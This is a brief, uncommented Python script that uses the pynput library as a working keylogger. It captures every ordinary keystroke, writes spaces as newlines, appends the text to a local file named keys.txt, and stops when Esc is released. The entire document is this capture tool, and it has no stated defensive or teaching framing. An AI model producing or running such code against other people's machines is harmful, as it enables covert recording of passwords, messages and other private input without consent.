from pynput.keyboard import Key, Listener


def key_pressed(key):
    k = str(key).replace("'", '')
    if key == Key.space:
        k = '\n'
    if k.find('Key.') == -1:
        with open('keys.txt', 'at') as f:
            f.write(k)


def key_released(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_pressed, on_release=key_released) as listener:
    listener.join()
